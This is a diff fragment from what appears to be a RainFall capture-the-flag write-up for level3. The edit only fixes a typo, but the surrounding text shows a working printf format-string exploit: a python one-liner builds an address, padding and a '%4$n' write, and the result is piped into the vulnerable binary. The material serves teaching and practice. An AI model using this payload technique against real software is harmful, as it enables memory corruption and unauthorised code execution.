@@ -44,7 +44,7 @@ Dump of assembler code for function v:
    0x08048519 <+117>:	ret
 End of assembler dump.
 
-3- we have use the formater %n of printf because it writes the number of cha0racters to be printed, so we have to put 64 characters
+3- we have use the formater %n of printf because it writes the number of characters to be printed, so we have to put 64 characters
 python -c "print('\x8c\x98\x04\x08' + 60 * 'A' + '%4\$n')" > /tmp/test
 level3@RainFall:~$ cat /tmp/test - | ./level3
 �AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
